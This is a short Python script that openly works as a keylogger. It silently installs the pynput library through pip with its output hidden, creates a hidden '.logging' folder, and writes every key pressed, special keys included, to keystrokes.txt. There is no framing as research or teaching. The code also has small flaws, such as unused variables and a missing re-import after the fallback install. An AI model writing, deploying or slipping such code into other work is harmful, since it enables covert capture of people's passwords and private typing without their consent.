import os 
import os,logging
from shutil import copyfile

def get_dep(module):
    cmd = 'yes | /usr/bin/python3 -m pip install %s >> /dev/null' % module
    os.system(cmd)

try:
    from pynput.keyboard import Listener
except ModuleNotFoundError:
    get_dep('pynput')
    print('error import pnput')
    pass

username = os.getlogin()
logging_file = f"logging"
if not os.path.isdir('.logging'):
    os.mkdir('.logging')
if not os.path.isfile(os.getcwd()+'/.logging/keystrokes.txt'):
    open(os.getcwd()+'/.logging/keystrokes.txt','wb').write('Keylogger Data:\n'.encode())

def keyhandler(key):
    try:
        letter = key.char
        open(os.getcwd()+'/.logging/keystrokes.txt','a').write(key.char)
    except AttributeError:
        # it's a special character
        if str(key) == 'Key.space':
            open(os.getcwd()+'/.logging/keystrokes.txt','a').write(' ')
        else:
            open(os.getcwd()+'/.logging/keystrokes.txt','a').write(str(key))
        pass



with Listener(on_press = keyhandler) as listener:

    listener.join()